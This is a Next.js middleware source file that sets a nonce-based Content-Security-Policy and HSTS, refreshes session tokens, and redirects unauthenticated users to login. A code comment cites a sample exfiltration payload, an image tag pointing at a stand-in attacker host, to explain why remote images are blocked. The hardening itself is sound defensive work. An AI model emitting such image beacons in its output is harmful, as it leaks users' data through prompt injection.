import { NextResponse, type NextRequest } from "next/server";
import { env } from "@/lib/env";
import {
  needsRefresh,
  openSession,
  sealSession,
  sessionCookieName,
  sessionCookieOptions,
  sessionFromTokens,
} from "@/lib/session";
import { refreshTokens } from "@/lib/upstream";

const PUBLIC_PAGES = new Set(["/login", "/verify_signup", "/reset_password", "/accept_invite"]);

function contentSecurityPolicy(nonce: string, isApi: boolean): string {
  if (isApi) return "default-src 'none'; frame-ancestors 'none'";
  const dev = process.env.NODE_ENV === "development";
  return [
    "default-src 'self'",
    `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'${dev ? " 'unsafe-eval'" : ""}`,
    // Dev HMR injects unnonced <style> tags; production styles are nonced or external.
    `style-src 'self' ${dev ? "'unsafe-inline'" : `'nonce-${nonce}'`}`,
    // No remote images: blocks markdown/prompt-injection exfiltration via <img src=https://attacker/?q=...>.
    "img-src 'self' blob: data:",
    "font-src 'self'",
    "connect-src 'self'",
    "object-src 'none'",
    "base-uri 'none'",
    "form-action 'self'",
    "frame-ancestors 'none'",
    ...(env().secureCookies ? ["upgrade-insecure-requests"] : []),
  ].join("; ");
}

/**
 * Runs before every page and BFF route:
 * 1. per-request CSP nonce + HSTS,
 * 2. proactive, de-duplicated access-token refresh (server components can't set cookies, so it happens here),
 * 3. redirect to /login for protected pages without a session (UX only; the API is the enforcement point).
 */
export async function proxy(request: NextRequest) {
  const { pathname } = request.nextUrl;
  const isApi = pathname.startsWith("/api/");
  const name = sessionCookieName();
  let session = await openSession(request.cookies.get(name)?.value);
  let setCookie: string | null | undefined; // undefined = unchanged, null = delete

  if (session && needsRefresh(session)) {
    const r = await refreshTokens(session.refreshToken, request.headers);
    if (r.kind === "ok") {
      session = sessionFromTokens(r.tokens);
      setCookie = await sealSession(session);
    } else if (r.kind === "invalid") {
      session = null;
      setCookie = null;
    }
  }
  if (setCookie !== undefined) {
    if (setCookie === null) request.cookies.delete(name);
    else request.cookies.set(name, setCookie);
  }

  let response: NextResponse;
  const nonce = Buffer.from(crypto.getRandomValues(new Uint8Array(16))).toString("base64");
  const csp = contentSecurityPolicy(nonce, isApi);
  if (!isApi && !session && !PUBLIC_PAGES.has(pathname)) {
    response = NextResponse.redirect(new URL("/login", request.url));
  } else {
    const headers = new Headers(request.headers);
    headers.set("Content-Security-Policy", csp); // Next.js reads the nonce from here while rendering
    response = NextResponse.next({ request: { headers } });
  }

  response.headers.set("Content-Security-Policy", csp);
  if (env().secureCookies) response.headers.set("Strict-Transport-Security", "max-age=63072000; includeSubDomains");
  if (setCookie === null) response.cookies.delete({ name, path: "/" });
  else if (setCookie !== undefined) response.cookies.set(name, setCookie, sessionCookieOptions());
  return response;
}

export const config = {
  matcher: ["/((?!_next/static|_next/image|favicon.ico).*)"],
};
